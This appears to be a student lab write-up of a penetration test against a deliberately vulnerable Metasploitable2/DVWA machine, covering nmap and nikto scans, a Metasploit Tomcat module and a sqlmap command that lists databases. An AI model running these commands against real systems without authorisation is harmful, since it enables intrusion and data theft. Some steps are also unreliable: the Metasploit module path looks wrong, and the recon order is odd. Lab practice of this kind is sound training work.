Target Environment
Target Machine: Metasploitable2
Target IP: 10.105.64.186
Attacker Machine: Kali Linux
Testing Environment: VirtualBox Lab
Step 1 – Setup Lab Environment

The vulnerable machine was deployed in a virtual lab environment using VirtualBox.
The attacker machine was Kali Linux.
Command used to identify IP address:

ifconfig

Target IP identified as:
10.105.64.186

Step 2 – Network Scanning

Network scanning was performed to find open ports and services.

Tool used: Nmap
Command:

nmap -sV 10.105.64.186

Purpose:

Discover open ports
Identify running services

Example result:

Port	Service
21	FTP
22	SSH
80	HTTP

Step 3 – Vulnerability Scanning

Web vulnerabilities were scanned using automated tools.

Tools used:

Nikto
OpenVAS
Nikto command:

nikto -h http://10.105.64.186

Purpose:

Detect web server vulnerabilities
Identify outdated software

Step 4 – Reconnaissance

Information about the target system was collected.

Tools used:

WHOIS
Shodan
Maltego
Purpose:

Identify exposed services
Gather system information

Step 5 – Exploitation

The discovered vulnerabilities were tested using exploitation tools.

Tool used: Metasploit

Commands:

msfconsole
use exploit/multi/http/tomcat_mgr_login
set RHOST 10.105.64.186
exploit

Result:

Exploit attempt performed on the target server.
Step 6 – SQL Injection Testing
SQL Injection vulnerability was tested using sqlmap.

Command:

sqlmap -u "http://10.105.64.186/dvwa/vulnerabilities/sqli/?id=1" --dbs

Result:

available databases:
dvwa
mysql
information_schema

This confirms the application is vulnerable to SQL Injection.

Step 7 – Post Exploitation

After exploitation, evidence was collected.
Tool used:

sha256sum
Purpose:

Verify file integrity
Collect forensic evidence

Step 8 – Reporting

All vulnerabilities and findings were documented in the final report.
Example Detection Log:

Timestamp	          Target IP	Vulnerability	PTES Phase
2026-03-06 11:30	10.105.64.186	SQL Injection	Exploitation
Conclusion

The VAPT exercise identified vulnerabilities in the target system including SQL Injection and exposed services. Proper security measures such as input validation, patching, and firewall configuration are recommended.
